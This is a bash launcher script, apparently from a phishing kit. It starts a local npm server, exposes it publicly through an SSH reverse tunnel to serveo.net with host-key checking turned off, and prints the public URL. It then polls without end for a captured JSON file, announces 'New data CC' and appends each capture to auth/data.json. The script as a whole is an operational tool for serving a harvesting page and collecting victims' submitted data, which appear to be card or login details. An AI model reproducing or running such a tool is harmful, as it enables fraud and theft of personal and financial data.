#!/bin/bash
#   _   _       _                                    _ _          
#  | | | | __ _| |_ ___ _   _ _ __   ___   _ __ ___ (_) | ___   _ 
#  | |_| |/ _` | __/ __| | | | '_ \ / _ \ | '_ ` _ \| | |/ / | | |
#  |  _  | (_| | |_\__ \ |_| | | | |  __/ | | | | | | |   <| |_| |
#  |_| |_|\__,_|\__|___/\__,_|_| |_|\___| |_| |_| |_|_|_|\_\\__,_|                                                              
 
#    MIT License

# Copyright (c) [2024] [Hatsune_Miku] 

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

PORT="8080"
GREEN="$(printf '\033[32m')" 
WHITE="$(printf '\033[37m')"
PS1="└─[${GREEN}-${WHITE}]"
START(){
clear
cat banner
echo -e "\n"
read -p "┌──[- sasame -] : command (start)
${PS1}: " start
if [ $start == "start" ]; then
START_SCRIPT_SHELL
else
echo -e "-ERRO : Try Again..."
sleep 0.75
clear
START
fi
}

START_SERVEO(){
    echo -e ""
echo -e "[-] Loading..."
    sleep 0.75;
#printf "\n${WHITE}[-] ${WHITEBG} ${BLACK}http://$HOST:$PORT ${RESETBG} ${WHITE} Initializing..."
sleep 2
echo ''
if [[ -e server/linksender ]]; then
rm -rf server/linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > server/linksender ' &
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" server/linksender)
echo -e "${WHITE}[-] URL: ${GREEN} $send_url${WHITE}"
SERVER_RU
}


START_SCRIPT_SHELL(){
npm start > /dev/null 2>&1 & 
START_SERVEO
}
if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

OK(){
    echo -e "${GREEN}"
    json_pp < dre3432432434342342q0000000xy.json
    echo -e "${WHITE}"
    cat dre3432432434342342q0000000xy.json >> auth/data.json
}

SERVER_RU(){
    sleep 0.75
echo "[-] ..."
    while true; do
    		if [[ -e "dre3432432434342342q0000000xy.json" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New data CC${WHITE} ~"
			OK
			rm -rf dre3432432434342342q0000000xy.json
		fi
        done
}
START
##START_SCRIPT_SHELL

